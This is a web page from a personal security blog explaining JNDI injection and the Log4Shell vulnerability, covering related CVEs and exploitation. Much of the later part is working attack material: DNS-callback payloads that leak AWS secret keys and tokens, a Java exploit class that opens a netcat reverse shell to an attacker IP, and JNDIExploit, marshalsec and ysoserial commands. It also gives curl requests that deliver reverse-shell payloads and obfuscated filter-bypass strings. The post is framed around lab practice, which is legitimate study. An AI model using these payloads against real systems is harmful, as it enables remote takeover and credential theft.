<!doctype html> <html lang="en"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> JNDI - Java Naming and Directory Interface & Log4Shell | 47z!h4Ck </title> <meta name="author" content="47z!Lu7h "> <meta name="description" content=""> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link href="/assets/css/bootstrap-toc.min.css?6f5af0bb9aab25d79b2448143cbeaa88" rel="stylesheet"> <link rel="shortcut icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>⚛️</text></svg>" > <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://47z1lu7h.github.io/projects/deserialization/2025-01-05-jndi-java-naming-and-directory-interface-and-log4shell/"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script src="/assets/js/theme.js?0afe9f0ae161375728f7bcc5eb5b4ab4"></script> </head> <body class="fixed-top-nav sticky-bottom-footer"> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> 47z!h4Ck </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">h0m3 </a> </li> <li class="nav-item "> <a class="nav-link" href="/blog/">blog </a> </li> <li class="nav-item active"> <a class="nav-link" href="/projects/">projects <span class="sr-only">(current)</span> </a> </li> <li class="nav-item "> <a class="nav-link" href="/repos/">repositories </a> </li> <li class="nav-item "> <a class="nav-link" href="/cv/">cv </a> </li> <li class="nav-item "> <a class="nav-link" href="/hacking/">hacking </a> </li> <li class="nav-item dropdown "> <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">more </a> <div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarDropdown"> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/about/">about</a> <div class="dropdown-divider"></div> <div class="dropdown-divider"></div> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/news/">news</a> <div class="dropdown-divider"></div> <div class="dropdown-divider"></div> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/projects/">projects</a> <div class="dropdown-divider"></div> </div> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="fa-solid fa-moon"></i> <i class="fa-solid fa-sun"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="row"> <div class="col-sm-3"> <nav id="toc-sidebar" class="sticky-top"></nav> </div> <div class="col-sm-9"><div class="post"> <header class="post-header"> <h1 class="post-title">JNDI - Java Naming and Directory Interface & Log4Shell</h1> <p class="post-description"></p> </header> <article> <h1 id="jndi---java-naming-and-directory-interface--log4shell">JNDI - Java Naming and Directory Interface &amp; Log4Shell</h1> <h2 id="basic-information">Basic Information</h2> <p>JNDI, integrated into Java since the late 1990s, serves as a directory service, enabling Java programs to locate data or objects through a naming system. It supports various directory services via service provider interfaces (SPIs), allowing data retrieval from different systems, including remote Java objects. Common SPIs include CORBA COS, Java RMI Registry, and LDAP.</p> <h3 id="jndi-naming-reference">JNDI Naming Reference</h3> <p>Java objects can be stored and retrieved using JNDI Naming References, which come in two forms:</p> <ul> <li><strong>Reference Addresses</strong>: Specifies an object’s location (e.g., <em>rmi://server/ref</em>), allowing direct retrieval from the specified address.</li> <li><strong>Remote Factory</strong>: References a remote factory class. When accessed, the class is downloaded and instantiated from the remote location.</li> </ul> <p>However, this mechanism can be exploited, potentially leading to the loading and execution of arbitrary code. As a countermeasure:</p> <ul> <li><strong>RMI</strong>: <code class="language-plaintext highlighter-rouge">java.rmi.server.useCodeabseOnly = true</code> by default from JDK 7u21, restricting remote object loading. A Security Manager further limits what can be loaded.</li> <li><strong>LDAP</strong>: <code class="language-plaintext highlighter-rouge">com.sun.jndi.ldap.object.trustURLCodebase = false</code> by default from JDK 6u141, 7u131, 8u121, blocking the execution of remotely loaded Java objects. If set to <code class="language-plaintext highlighter-rouge">true</code>, remote code execution is possible without a Security Manager’s oversight.</li> <li><strong>CORBA</strong>: Doesn’t have a specific property, but the Security Manager is always active.</li> </ul> <p>However, the <strong>Naming Manager</strong>, responsible for resolving JNDI links, lacks built-in security mechanisms, potentially allowing the retrieval of objects from any source. This poses a risk as RMI, LDAP, and CORBA protections can be circumvented, leading to the loading of arbitrary Java objects or exploiting existing application components (gadgets) to run malicious code.</p> <p>Examples of exploitable URLs include:</p> <ul> <li><em>rmi://attacker-server/bar</em></li> <li><em>ldap://attacker-server/bar</em></li> <li><em>iiop://attacker-server/bar</em></li> </ul> <p>Despite protections, vulnerabilities remain, mainly due to the lack of safeguards against loading JNDI from untrusted sources and the possibility of bypassing existing protections.</p> <h3 id="jndi-example">JNDI Example</h3> <p><img src="../../images/image (1022).png" alt=""/></p> <p>Even if you have set a <strong><code class="language-plaintext highlighter-rouge">PROVIDER_URL</code></strong>, you can indicate a different one in a lookup and it will be accessed: <code class="language-plaintext highlighter-rouge">ctx.lookup("&lt;attacker-controlled-url&gt;")</code> and that is what an attacker will abuse to load arbitrary objects from a system controlled by him.</p> <h3 id="corba-overview">CORBA Overview</h3> <p>CORBA (Common Object Request Broker Architecture) employs an <strong>Interoperable Object Reference (IOR)</strong> to uniquely identify remote objects. This reference includes essential information like:</p> <ul> <li><strong>Type ID</strong>: Unique identifier for an interface.</li> <li><strong>Codebase</strong>: URL for obtaining the stub class.</li> </ul> <p>Notably, CORBA isn’t inherently vulnerable. Ensuring security typically involves:</p> <ul> <li>Installation of a <strong>Security Manager</strong>.</li> <li>Configuring the Security Manager to permit connections to potentially malicious codebases. This can be achieved through: <ul> <li>Socket permission, e.g., <code class="language-plaintext highlighter-rouge">permissions java.net.SocketPermission "*:1098-1099", "connect";</code>.</li> <li>File read permissions, either universally (<code class="language-plaintext highlighter-rouge">permission java.io.FilePermission "&lt;&lt;ALL FILES&gt;&gt;", "read";</code>) or for specific directories where malicious files might be placed.</li> </ul> </li> </ul> <p>However, some vendor policies might be lenient and allow these connections by default.</p> <h3 id="rmi-context">RMI Context</h3> <p>For RMI (Remote Method Invocation), the situation is somewhat different. As with CORBA, arbitrary class downloading is restricted by default. To exploit RMI, one would typically need to circumvent the Security Manager, a feat also relevant in CORBA.</p> <h3 id="ldap">LDAP</h3> <p>First of all, wee need to distinguish between a Search and a Lookup.<br/> A <strong>search</strong> will use an URL like <code class="language-plaintext highlighter-rouge">ldap://localhost:389/o=JNDITutorial</code> to find the JNDITutorial object from an LDAP server and <strong>retreive its attributes</strong>.<br/> A <strong>lookup</strong> is meant for <strong>naming services</strong> as we want to get <strong>whatever is bound to a name</strong>.</p> <p>If the LDAP search was invoked with <strong>SearchControls.setReturningObjFlag() with <code class="language-plaintext highlighter-rouge">true</code>, then the returned object will be reconstructed</strong>.</p> <p>Therefore, there are several ways to attack these options.<br/> An <strong>attacker may poison LDAP records introducing payloads</strong> on them that will be executed in the systems that gather them (very useful to <strong>compromise tens of machines</strong> if you have access to the LDAP server). Another way to exploit this would be to perform a <strong>MitM attack in a LDAP searc</strong>h for example.</p> <p>In case you can <strong>make an app resolve a JNDI LDAP UR</strong>L, you can control the LDAP that will be searched, and you could send back the exploit (log4shell).</p> <h4 id="deserialization-exploit">Deserialization exploit</h4> <p><img src="../../images/image (275).png" alt=""/></p> <p>The <strong>exploit is serialized</strong> and will be deserialized.<br/> In case <code class="language-plaintext highlighter-rouge">trustURLCodebase</code> is <code class="language-plaintext highlighter-rouge">true</code>, an attacker can provide his own classes in the codebase if not, he will need to abuse gadgets in the classpath.</p> <h4 id="jndi-reference-exploit">JNDI Reference exploit</h4> <p>It’s easier to attack this LDAP using <strong>JavaFactory references</strong>:</p> <p><img src="../../images/image (1059).png" alt=""/></p> <h2 id="log4shell-vulnerability">Log4Shell Vulnerability</h2> <p>The vulnerability is introduced in Log4j because it supports a <a href="https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution"><strong>special syntax</strong></a> in the form <code class="language-plaintext highlighter-rouge">${prefix:name}</code> where <code class="language-plaintext highlighter-rouge">prefix</code> is one of a number of different <a href="https://logging.apache.org/log4j/2.x/manual/lookups.html"><strong>Lookups</strong></a> where <code class="language-plaintext highlighter-rouge">name</code> should be evaluated. For example, <code class="language-plaintext highlighter-rouge">${java:version}</code> is the current running version of Java.</p> <p><a href="https://issues.apache.org/jira/browse/LOG4J2-313"><strong>LOG4J2-313</strong></a> introduced a <code class="language-plaintext highlighter-rouge">jndi</code> Lookup feature. This feature enables the retrieval of variables through JNDI. Typically, the key is automatically prefixed with <code class="language-plaintext highlighter-rouge">java:comp/env/</code>. However, if the key itself includes a <strong>”:”</strong>, this default prefix is not applied.</p> <p>With a <strong>: present</strong> in the key, as in <code class="language-plaintext highlighter-rouge">${jndi:ldap://example.com/a}</code> there’s <strong>no prefix</strong> and the <strong>LDAP server is queried for the object</strong>. And these Lookups can be used in both the configuration of Log4j as well as when lines are logged.</p> <p>Therefore, the only thing needed to get RCE a <strong>vulnerable version of Log4j processing information controlled by the user</strong>. And because this is a library widely used by Java applications to log information (Internet facing applications included) it was very common to have log4j logging for example HTTP headers received like the User-Agent. However, log4j is <strong>not used to log only HTTP information but any input</strong> and data the developer indicated.</p> <h2 id="overview-of-log4shell-related-cves">Overview of Log4Shell-Related CVEs</h2> <h3 id="cve-2021-44228-critical"><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-44228">CVE-2021-44228</a> <strong>[Critical]</strong></h3> <p>This vulnerability is a critical <strong>untrusted deserialization flaw</strong> in the <code class="language-plaintext highlighter-rouge">log4j-core</code> component, affecting versions from 2.0-beta9 to 2.14.1. It allows <strong>remote code execution (RCE)</strong>, enabling attackers to take over systems. The issue was reported by Chen Zhaojun from Alibaba Cloud Security Team and affects various Apache frameworks. The initial fix in version 2.15.0 was incomplete. Sigma rules for defense are available (<a href="https://github.com/SigmaHQ/sigma/blob/master/rules/web/web_cve_2021_44228_log4j_fields.yml">Rule 1</a>, <a href="https://github.com/SigmaHQ/sigma/blob/master/rules/web/web_cve_2021_44228_log4j.yml">Rule 2</a>).</p> <h3 id="cve-2021-45046-critical"><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-45046">CVE-2021-45046</a> <strong>[Critical]</strong></h3> <p>Initially rated low but later upgraded to critical, this CVE is a <strong>Denial of Service (DoS)</strong> flaw resulting from an incomplete fix in 2.15.0 for CVE-2021-44228. It affects non-default configurations, allowing attackers to cause DoS attacks through crafted payloads. A <a href="https://twitter.com/marcioalm/status/1471740771581652995">tweet</a> showcases a bypass method. The issue is resolved in versions 2.16.0 and 2.12.2 by removing message lookup patterns and disabling JNDI by default.</p> <h3 id="cve-2021-4104-high"><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-4104">CVE-2021-4104</a> <strong>[High]</strong></h3> <p>Affecting <strong>Log4j 1.x versions</strong> in non-default configurations using <code class="language-plaintext highlighter-rouge">JMSAppender</code>, this CVE is an untrusted deserialization flaw. No fix is available for the 1.x branch, which is end-of-life, and upgrading to <code class="language-plaintext highlighter-rouge">log4j-core 2.17.0</code> is recommended.</p> <h3 id="cve-2021-42550-moderate"><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-42550">CVE-2021-42550</a> <strong>[Moderate]</strong></h3> <p>This vulnerability affects the <strong>Logback logging framework</strong>, a successor to Log4j 1.x. Previously thought to be safe, the framework was found vulnerable, and newer versions (1.3.0-alpha11 and 1.2.9) have been released to address the issue.</p> <h3 id="cve-2021-45105-high"><strong>CVE-2021-45105</strong> <strong>[High]</strong></h3> <p>Log4j 2.16.0 contains a DoS flaw, prompting the release of <code class="language-plaintext highlighter-rouge">log4j 2.17.0</code> to fix the CVE. Further details are in BleepingComputer’s <a href="https://www.bleepingcomputer.com/news/security/upgraded-to-log4j-216-surprise-theres-a-217-fixing-dos/">report</a>.</p> <h3 id="cve-2021-44832"><a href="https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/">CVE-2021-44832</a></h3> <p>Affecting log4j version 2.17, this CVE requires the attacker to control the configuration file of log4j. It involves potential arbitrary code execution via a configured JDBCAppender. More details are available in the <a href="https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/">Checkmarx blog post</a>.</p> <h2 id="log4shell-exploitation">Log4Shell Exploitation</h2> <h3 id="discovery">Discovery</h3> <p>This vulnerability is very easy to discover if unprotected because it will send at least a <strong>DNS request</strong> to the address you indicate in your payload. Therefore, payloads like:</p> <ul> <li><code class="language-plaintext highlighter-rouge">${jndi:ldap://x${hostName}.L4J.lt4aev8pktxcq2qlpdr5qu5ya.canarytokens.com/a}</code> (using <a href="https://canarytokens.org/generate">canarytokens.com</a>)</li> <li><code class="language-plaintext highlighter-rouge">${jndi:ldap://c72gqsaum5n94mgp67m0c8no4hoyyyyyn.interact.sh}</code> (using <a href="https://github.com/projectdiscovery/interactsh">interactsh</a>)</li> <li><code class="language-plaintext highlighter-rouge">${jndi:ldap://abpb84w6lqp66p0ylo715m5osfy5mu.burpcollaborator.net}</code> (using Burp Suite)</li> <li><code class="language-plaintext highlighter-rouge">${jndi:ldap://2j4ayo.dnslog.cn}</code> (using <a href="http://dnslog.cn">dnslog</a>)</li> <li><code class="language-plaintext highlighter-rouge">${jndi:ldap://log4shell.huntress.com:1389/hostname=${env:HOSTNAME}/fe47f5ee-efd7-42ee-9897-22d18976c520}</code> using (using <a href="https://log4shell.huntress.com">huntress</a>)</li> </ul> <p>Note that <strong>even if a DNS request is received that doesn’t mean the application is exploitable</strong> (or even vulnerable), you will need to try to exploit it.</p> <blockquote> <p>[!NOTE] Remember that to <strong>exploit version 2.15</strong> you need to add the <strong>localhost check bypass</strong>: ${jndi:ldap://<strong>127.0.0.1#</strong>…}</p> </blockquote> <h4 id="local-discovery"><strong>Local Discovery</strong></h4> <p>Search for <strong>local vulnerable versions</strong> of the library with:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-name</span> <span class="s2">"log4j-core*.jar"</span> 2&gt;/dev/null | <span class="nb">grep</span> <span class="nt">-E</span> <span class="s2">"log4j</span><span class="se">\-</span><span class="s2">core</span><span class="se">\-</span><span class="s2">(1</span><span class="se">\.</span><span class="s2">[^0]|2</span><span class="se">\.</span><span class="s2">[0-9][^0-9]|2</span><span class="se">\.</span><span class="s2">1[0-6])"</span>
</code></pre></div></div> <h3 id="verification"><strong>Verification</strong></h3> <p>Some of the platforms listed before will allow you to insert some variable data that will be logged when it’s requested.<br/> This can be very useful for 2 things:</p> <ul> <li>To <strong>verify</strong> the vulnerability</li> <li>To <strong>exfiltrate information</strong> abusing the vulnerability</li> </ul> <p>For example you could request something like:<br/> or like <code class="language-plaintext highlighter-rouge">${</code><strong><code class="language-plaintext highlighter-rouge">jndi:ldap://jv-${sys:java.version}-hn-${hostName}.ei4frk.dnslog.cn/a}</code></strong> and if a <strong>DNS request is received with the value of the env variable</strong>, you know the application is vulnerable.</p> <p>Other information you could try to <strong>leak</strong>:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>${env:AWS_ACCESS_KEY_ID}
${env:AWS_CONFIG_FILE}
${env:AWS_PROFILE}
${env:AWS_SECRET_ACCESS_KEY}
${env:AWS_SESSION_TOKEN}
${env:AWS_SHARED_CREDENTIALS_FILE}
${env:AWS_WEB_IDENTITY_TOKEN_FILE}
${env:HOSTNAME}
${env:JAVA_VERSION}
${env:PATH}
${env:USER}
${hostName}
${java.vendor}
${java:os}
${java:version}
${log4j:configParentLocation}
${sys:PROJECT_HOME}
${sys:file.separator}
${sys:java.class.path}
${sys:java.class.path}
${sys:java.class.version}
${sys:java.compiler}
${sys:java.ext.dirs}
${sys:java.home}
${sys:java.io.tmpdir}
${sys:java.library.path}
${sys:java.specification.name}
${sys:java.specification.vendor}
${sys:java.specification.version}
${sys:java.vendor.url}
${sys:java.vendor}
${sys:java.version}
${sys:java.vm.name}
${sys:java.vm.specification.name}
${sys:java.vm.specification.vendor}
${sys:java.vm.specification.version}
${sys:java.vm.vendor}
${sys:java.vm.version}
${sys:line.separator}
${sys:os.arch}
${sys:os.name}
${sys:os.version}
${sys:path.separator}
${sys:user.dir}
${sys:user.home}
${sys:user.name}

Any other env variable name that could store sensitive information
</code></pre></div></div> <h3 id="rce-information">RCE Information</h3> <blockquote> <p>[!NOTE] Hosts running on JDK versions above 6u141, 7u131, or 8u121 are safeguarded against the LDAP class loading attack vector. This is due to the default deactivation of <code class="language-plaintext highlighter-rouge">com.sun.jndi.ldap.object.trustURLCodebase</code>, which prevents JNDI from loading a remote codebase via LDAP. However, it’s crucial to note that these versions are <strong>not protected against the deserialization attack vector</strong>.</p> <p>For attackers aiming to exploit these higher JDK versions, it’s necessary to leverage a <strong>trusted gadget</strong> within the Java application. Tools like ysoserial or JNDIExploit are often used for this purpose. On the contrary, exploiting lower JDK versions is relatively easier as these versions can be manipulated to load and execute arbitrary classes.</p> <p>For <strong>more information</strong> (<em>like limitations on RMI and CORBA vectors</em>) <strong>check the previous JNDI Naming Reference section</strong> or <a href="https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/">https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/</a></p> </blockquote> <h3 id="rce---marshalsec-with-custom-payload">RCE - Marshalsec with custom payload</h3> <p>You can test this in the <strong>THM box:</strong> <a href="https://tryhackme.com/room/solar"><strong>https://tryhackme.com/room/solar</strong></a></p> <p>Use the tool <a href="https://github.com/mbechler/marshalsec"><strong>marshalsec</strong></a> (jar version available <a href="https://github.com/RandomRobbieBF/marshalsec-jar"><strong>here</strong></a>). This approach establishes a LDAP referral server to redirect connections to a secondary HTTP server where the exploit will be hosted:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>java <span class="nt">-cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class="s2">"http://&lt;your_ip_http_server&gt;:8000/#Exploit"</span>
</code></pre></div></div> <p>To prompt the target to load a reverse shell code, craft a Java file named <code class="language-plaintext highlighter-rouge">Exploit.java</code> with the content below:</p> <div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Exploit</span> <span class="o">{</span>
    <span class="kd">static</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">"nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999"</span><span class="o">);</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div> <p>Compile the Java file into a class file using: <code class="language-plaintext highlighter-rouge">javac Exploit.java -source 8 -target 8</code>. Next, initiate a <strong>HTTP server</strong> in the directory containing the class file with: <code class="language-plaintext highlighter-rouge">python3 -m http.server</code>. Ensure the <strong>marshalsec LDAP server</strong> references this HTTP server.</p> <p>Trigger the execution of the exploit class on the susceptible web server by dispatching a payload resembling:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">${</span><span class="nv">jndi</span>:ldap://<span class="p">&lt;LDAP_IP&gt;</span>:1389/Exploit<span class="k">}</span>
</code></pre></div></div> <p><strong>Note:</strong> This exploit hinges on Java’s configuration to permit remote codebase loading via LDAP. If this is not permissible, consider exploiting a trusted class for arbitrary code execution.</p> <h3 id="rce---jndiexploit">RCE - <strong>JNDIExploit</strong></h3> <blockquote> <p>[!NOTE] Note that for some reason the author removed this project from github after the discovery of log4shell. You can find a cached version in <a href="https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2">https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2</a> but if you want to respect the decision of the author use a different method to exploit this vuln.</p> <p>Moreover, you cannot find the source code in wayback machine, so either analyse the source code, or execute the jar knowing that you don’t know what you are executing.</p> </blockquote> <p>For this example you can just run this <strong>vulnerable web server to log4shell</strong> in port 8080: <a href="https://github.com/christophetd/log4shell-vulnerable-app">https://github.com/christophetd/log4shell-vulnerable-app</a> (<em>in the README you will find how to run it</em>). This vulnerable app is logging with a vulnerable version of log4shell the content of the HTTP request header <em>X-Api-Version</em>.</p> <p>Then, you can download the <strong>JNDIExploit</strong> jar file and execute it with:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
unzip JNDIExploit.v1.2.zip
java <span class="nt">-jar</span> JNDIExploit-1.2-SNAPSHOT.jar <span class="nt">-i</span> 172.17.0.1 <span class="nt">-p</span> 8888 <span class="c"># Use your private IP address and a port where the victim will be able to access</span>
</code></pre></div></div> <p>After reading the code just a couple of minutes, in <em>com.feihong.ldap.LdapServer</em> and <em>com.feihong.ldap.HTTPServer</em> you can see how the <strong>LDAP and HTTP servers are created</strong>. The LDAP server will understand what payload need to be served and will redirect the victim to the HTTP server, which will serve the exploit.<br/> In <em>com.feihong.ldap.gadgets</em> you can find <strong>some specific gadgets</strong> that can be used to excute the desired action (potentially execute arbitrary code). And in <em>com.feihong.ldap.template</em> you can see the different template classes that will <strong>generate the exploits</strong>.</p> <p>You can see all the available exploits with <strong><code class="language-plaintext highlighter-rouge">java -jar JNDIExploit-1.2-SNAPSHOT.jar -u</code></strong>. Some useful ones are:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ldap://null:1389/Basic/Dnslog/[domain]
ldap://null:1389/Basic/Command/Base64/[base64_encoded_cmd]
ldap://null:1389/Basic/ReverseShell/[ip]/[port]
<span class="c"># But there are a lot more</span>
</code></pre></div></div> <p>So, in our example, we already have that docker vulnerable app running. To attack it:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Create a file inside of th vulnerable host:</span>
curl 127.0.0.1:8080 <span class="nt">-H</span> <span class="s1">'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'</span>

<span class="c"># Get a reverse shell (only unix)</span>
curl 127.0.0.1:8080 <span class="nt">-H</span> <span class="s1">'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/ReverseShell/172.17.0.1/4444}'</span>
curl 127.0.0.1:8080 <span class="nt">-H</span> <span class="s1">'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/bmMgMTcyLjE3LjAuMSA0NDQ0IC1lIC9iaW4vc2gK}'</span>
</code></pre></div></div> <p>When sending the attacks you will see some output in the terminal where you executed <strong>JNDIExploit-1.2-SNAPSHOT.jar</strong>.</p> <p><strong>Remember to check <code class="language-plaintext highlighter-rouge">java -jar JNDIExploit-1.2-SNAPSHOT.jar -u</code> for other exploitation options. Moreover, in case you need it, you can change the port of the LDAP and HTTP servers.</strong></p> <h3 id="rce---jndi-exploit-kit-">RCE - JNDI-Exploit-Kit <a href="#rce__jndiexploitkit_33" id="rce__jndiexploitkit_33"></a></h3> <p>In a similar way to the previous exploit, you can try to use <a href="https://github.com/pimps/JNDI-Exploit-Kit"><strong>JNDI-Exploit-Kit</strong></a> to exploit this vulnerability.<br/> You can generate the URLs to send to the victim running:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Get reverse shell in port 4444 (only unix)</span>
java <span class="nt">-jar</span> JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar <span class="nt">-L</span> 172.17.0.1:1389 <span class="nt">-J</span> 172.17.0.1:8888 <span class="nt">-S</span> 172.17.0.1:4444

<span class="c"># Execute command</span>
java <span class="nt">-jar</span> JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar <span class="nt">-L</span> 172.17.0.1:1389 <span class="nt">-J</span> 172.17.0.1:8888 <span class="nt">-C</span> <span class="s2">"touch /tmp/log4shell"</span>
</code></pre></div></div> <p><em>This attack using a custom generated java object will work in labs like the <strong>THM solar room</strong>. However, this won’t generally work (as by default Java is not configured to load remote codebase using LDAP) I think because it’s not abusing a trusted class to execute arbitrary code.</em></p> <h3 id="rce---jndi-injection-exploit-plus">RCE - JNDI-Injection-Exploit-Plus</h3> <p><a href="https://github.com/cckuailong/JNDI-Injection-Exploit-Plus">https://github.com/cckuailong/JNDI-Injection-Exploit-Plus</a> is another tool for generating <strong>workable JNDI links</strong> and provide background services by starting RMI server,LDAP server and HTTP server.\</p> <h3 id="rce---ysoserial--jndi-exploit-kit">RCE - ysoserial &amp; JNDI-Exploit-Kit</h3> <p>This option is really useful to attack <strong>Java versions configured to only trust specified classes and not everyone</strong>. Therefore, <strong>ysoserial</strong> will be used to generate <strong>serializations of trusted classes</strong> that can be used as gadgets to <strong>execute arbitrary code</strong> (<em>the trusted class abused by ysoserial must be used by the victim java program in order for the exploit to work</em>).</p> <p>Using <strong>ysoserial</strong> or <a href="https://github.com/pimps/ysoserial-modified"><strong>ysoserial-modified</strong></a> you can create the deserialization exploit that will be downloaded by JNDI:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Rev shell via CommonsCollections5</span>
java <span class="nt">-jar</span> ysoserial-modified.jar CommonsCollections5 bash <span class="s1">'bash -i &gt;&amp; /dev/tcp/10.10.14.10/7878 0&gt;&amp;1'</span> <span class="o">&gt;</span> /tmp/cc5.ser
</code></pre></div></div> <p>Use <a href="https://github.com/pimps/JNDI-Exploit-Kit"><strong>JNDI-Exploit-Kit</strong></a> to generate <strong>JNDI links</strong> where the exploit will be waiting for connections from the vulnerable machines. You can server <strong>different exploit that can be automatically generated</strong> by the JNDI-Exploit-Kit or even your <strong>own deserialization payloads</strong> (generated by you or ysoserial).</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>java <span class="nt">-jar</span> JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar <span class="nt">-L</span> 10.10.14.10:1389 <span class="nt">-P</span> /tmp/cc5.ser
</code></pre></div></div> <p><img src="../../images/image (1118).png" alt=""/></p> <p>Now you can easily use a generated JNDI link to exploit the vulnerability and obtain a <strong>reverse shell</strong> just sending to a vulnerable version of log4j: <strong><code class="language-plaintext highlighter-rouge">${ldap://10.10.14.10:1389/generated}</code></strong></p> <h3 id="bypasses">Bypasses</h3> <div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">$</span><span class="o">{</span><span class="err">$</span><span class="o">{</span><span class="nl">env:ENV_NAME:</span><span class="o">-</span><span class="n">j</span><span class="o">}</span><span class="n">ndi</span><span class="err">$</span><span class="o">{</span><span class="nl">env:ENV_NAME:</span><span class="o">-:}</span><span class="err">$</span><span class="o">{</span><span class="nl">env:ENV_NAME:</span><span class="o">-</span><span class="n">l</span><span class="o">}</span><span class="n">dap</span><span class="err">$</span><span class="o">{</span><span class="nl">env:ENV_NAME:</span><span class="o">-:}</span><span class="c1">//attackerendpoint.com/}</span>
<span class="err">$</span><span class="o">{</span><span class="err">$</span><span class="o">{</span><span class="nl">lower:</span><span class="n">j</span><span class="o">}</span><span class="nl">ndi:</span><span class="err">$</span><span class="o">{</span><span class="nl">lower:</span><span class="n">l</span><span class="o">}</span><span class="err">$</span><span class="o">{</span><span class="nl">lower:</span><span class="n">d</span><span class="o">}</span><span class="n">a</span><span class="err">$</span><span class="o">{</span><span class="nl">lower:</span><span class="n">p</span><span class="o">}:</span><span class="c1">//attackerendpoint.com/}</span>
